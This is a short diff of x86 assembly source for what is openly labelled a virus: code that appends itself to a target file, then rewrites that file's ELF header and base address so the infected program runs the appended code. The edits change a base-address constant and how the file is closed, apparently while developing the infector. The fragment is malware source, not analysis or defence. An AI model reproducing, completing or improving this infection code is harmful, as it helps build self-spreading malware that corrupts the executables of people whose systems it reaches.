@@ -94,19 +94,18 @@ _start:
     mov fsize, eax                            ; store file size
     call get_my_loc
     add ecx, _start                           ; point to start of this file
-    mov edx , virus_end-_start                ; script content
+    mov edx , virus_end - _start                ; script content
     write FD, ecx, edx                        ; append this script to a file
 
     .update_header:
-    mov eax, 0x8048000                        ; base addres
+    mov eax, 0x8048080                        ; base addres
     add eax, fsize
     lseek FD, 0, SEEK_SET                     ; point to the end of the file
 
     lea ecx, [elf_hdr]                        ; save offset
     write FD, ecx, ELFHDR_size                ; write the modified header
 
-
-    exit 0
+    close FD
 
 VirusExit:
     exit 0                                    ; Termination if all is OK and no previous code to jump to
